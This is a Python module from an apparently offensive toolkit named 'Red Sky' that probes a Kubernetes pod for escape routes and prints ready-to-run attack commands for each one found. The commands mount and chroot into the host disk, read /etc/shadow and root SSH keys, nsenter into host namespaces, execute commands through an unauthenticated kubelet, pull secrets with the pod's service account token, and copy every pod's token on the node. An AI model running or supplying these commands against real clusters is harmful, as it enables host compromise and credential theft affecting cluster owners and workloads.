# language: Python, file: Program/container_escape/k8s.py, target: Red Sky container_escape — K8s escapes
# Detects and executes common Kubernetes pod escapes: privileged pods,
# hostPID/hostNetwork, hostPath mounts, dangerous capabilities, RBAC.

import json
import os
import sys
import time
from pathlib import Path
from typing import Dict, List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


CE_DIR = OUTPUT_DIR / "container_escape"


def _exists(p): return Path(p).exists()
def _read(p, d=""):
    try: return Path(p).read_text(errors="replace").strip()
    except OSError: return d


def _cap_effective() -> int:
    status = _read("/proc/self/status")
    for line in status.splitlines():
        if line.startswith("CapEff:"):
            try: return int(line.split()[1], 16)
            except (ValueError, IndexError): return 0
    return 0


def _pod_manifests() -> List[str]:
    """Look for the pod's own YAML — often mounted in the SA dir or /etc/podinfo."""
    hits = []
    for p in (
        "/etc/podinfo/annotations",
        "/etc/podinfo/labels",
        "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    ):
        if _exists(p):
            hits.append(p)
    return hits


# ── 1. privileged pod ──
def check_privileged() -> Dict:
    cap = _cap_effective()
    privileged = (cap == 0x000001ffffffffff)
    return {
        "technique": "privileged_pod",
        "available": privileged,
        "cap_hex": hex(cap),
        "commands": [
            "mount /dev/sda1 /mnt/host && chroot /mnt/host /bin/bash",
            "cat /mnt/host/etc/shadow",
            "cat /mnt/host/root/.ssh/id_rsa",
        ] if privileged else [],
        "note": "privileged pod = host root access. Same as privileged docker container.",
    }


# ── 2. hostPID ──
def check_hostpid() -> Dict:
    """If hostPID, our PID namespace is shared with the host — we can see host processes."""
    p1 = _read("/proc/1/comm")
    host_pid = p1 in ("systemd", "init", "launchd")
    # also compare PID ns
    try:
        self_ns = os.readlink("/proc/self/ns/pid")
        init_ns = os.readlink("/proc/1/ns/pid")
        same_ns = (self_ns == init_ns)
    except OSError:
        same_ns = False

    available = host_pid or same_ns
    return {
        "technique": "host_pid",
        "available": available,
        "pid1": p1,
        "pid_ns_shared": same_ns,
        "commands": [
            "nsenter -t 1 -m -u -i -n -p -- /bin/bash",
            "ps aux",
        ] if available else [],
        "note": "hostPID = PID 1 is host init. nsenter into host namespace directly.",
    }


# ── 3. hostPath mounts ──
def check_hostpath() -> Dict:
    mounts = _read("/proc/mounts")
    suspicious = []
    for line in mounts.splitlines():
        parts = line.split()
        if len(parts) < 3: continue
        mp = parts[1]
        for key in ("/host", "/hostfs", "/mnt/host", "/var/lib/docker",
                    "/var/lib/kubelet", "/etc/kubernetes", "/proc", "/sys"):
            if mp.startswith(key) and not mp.startswith("/proc/") and not mp.startswith("/sys/"):
                suspicious.append(line)
                break
    return {
        "technique": "hostpath_mount",
        "available": bool(suspicious),
        "mounts": suspicious,
        "commands": [f"ls -la {l.split()[1]}" for l in suspicious],
        "note": "hostPath gives direct read of the host fs. /var/lib/kubelet often holds SA tokens for every pod.",
    }


# ── 4. kubelet API abuse ──
def check_kubelet() -> Dict:
    """kubelet 10250 is often exposed and unauthenticated."""
    import socket
    host_ip = os.environ.get("KUBERNETES_SERVICE_HOST", "")
    reachable = False
    if host_ip:
        try:
            s = socket.create_connection((host_ip, 10250), timeout=3)
            s.close()
            reachable = True
        except OSError:
            pass
    return {
        "technique": "kubelet_api",
        "available": reachable,
        "host": host_ip,
        "commands": [
            f"curl -k https://{host_ip}:10250/pods",
            f"curl -k https://{host_ip}:10250/run/<ns>/<pod>/<container> -X POST -d 'cmd=id'",
        ] if reachable else [],
        "note": "kubelet /run endpoint executes commands in any container on the node. No auth by default.",
    }


# ── 5. Service account token abuse ──
def check_sa_token() -> Dict:
    sa_dir = Path("/var/run/secrets/kubernetes.io/serviceaccount")
    ns = _read(sa_dir / "namespace")
    tok = _read(sa_dir / "token")
    available = bool(tok)
    k8s_host = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
    return {
        "technique": "service_account_token",
        "available": available,
        "namespace": ns,
        "k8s_api": k8s_host,
        "commands": [
            f"curl -k -H 'Authorization: Bearer {tok[:20]}...' https://{k8s_host}/api/v1/namespaces/{ns}/secrets",
            f"curl -k -H 'Authorization: Bearer {tok[:20]}...' https://{k8s_host}/api/v1/pods",
        ] if available else [],
        "note": "SA token inherits RBAC. Check what verbs you have — often secrets/exec/create.",
    }


# ── 6. Node-level token theft ──
def check_node_token_theft() -> Dict:
    """If we can read /var/lib/kubelet or any hostPath to kubelet, we can steal every pod's SA token on this node."""
    kubelet_dir = "/var/lib/kubelet/pods"
    available = _exists(kubelet_dir)
    cmds = []
    if available:
        cmds = [
            f"find {kubelet_dir} -name token -path '*serviceaccount*' -exec cat {{}} \\;",
            f"find {kubelet_dir} -name token -exec cp {{}} /tmp/ -v \\;",
        ]
    return {
        "technique": "node_token_theft",
        "available": available,
        "commands": cmds,
        "note": "every pod's SA token is on disk under /var/lib/kubelet/pods/<uid>/volumes/...",
    }


TECHNIQUES = {
    "privileged":     check_privileged,
    "host-pid":       check_hostpid,
    "hostpath":       check_hostpath,
    "kubelet":        check_kubelet,
    "sa-token":       check_sa_token,
    "node-tokens":    check_node_token_theft,
}


def cmd_list() -> int:
    print_info(f"{len(TECHNIQUES)} k8s escape techniques")
    print()
    for name, fn in TECHNIQUES.items():
        r = fn()
        mark = f"{OK}▓{RESET}" if r["available"] else f"{ASH}░{RESET}"
        print(f"  {mark} {BONE}{name:<16}{RESET} {ASH}{r['technique']}{RESET}")
        print(f"      {CLOT}{r.get('note', '')[:100]}{RESET}")
    return 0


def cmd_run(technique: str, out_file: str = "") -> int:
    if technique == "all":
        names = list(TECHNIQUES.keys())
    elif technique in TECHNIQUES:
        names = [technique]
    else:
        print_err(f"unknown technique: {technique}")
        print_info("available: " + ", ".join(TECHNIQUES.keys()) + ", all")
        return 2

    CE_DIR.mkdir(parents=True, exist_ok=True)
    results = []
    for name in names:
        print(f"\n{ARTERY}{BOLD}── {name}{RESET}")
        r = TECHNIQUES[name]()
        if r["available"]:
            print_ok("precondition met")
            for c in r.get("commands", []):
                print(f"  {SCARLET}$ {c}{RESET}")
            if r.get("note"):
                print(f"  {ASH}{r['note']}{RESET}")
        else:
            print_warn("not available")
        results.append(r)

    out = Path(out_file) if out_file else CE_DIR / f"k8s_escapes_{int(time.time())}.json"
    out.write_text(json.dumps(results, indent=2, default=str))
    print()
    print_kv("saved", out)
    return 0


def run_cli(args):
    if not args or args[0] == "list":
        return cmd_list()
    if args[0] == "run":
        if len(args) < 2:
            print_err("run needs a technique name (or 'all')")
            return 2
        out = ""
        if "--out" in args:
            i = args.index("--out")
            if i + 1 < len(args):
                out = args[i + 1]
        return cmd_run(args[1], out)
    print_err(f"unknown k8s sub-command: {args[0]}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
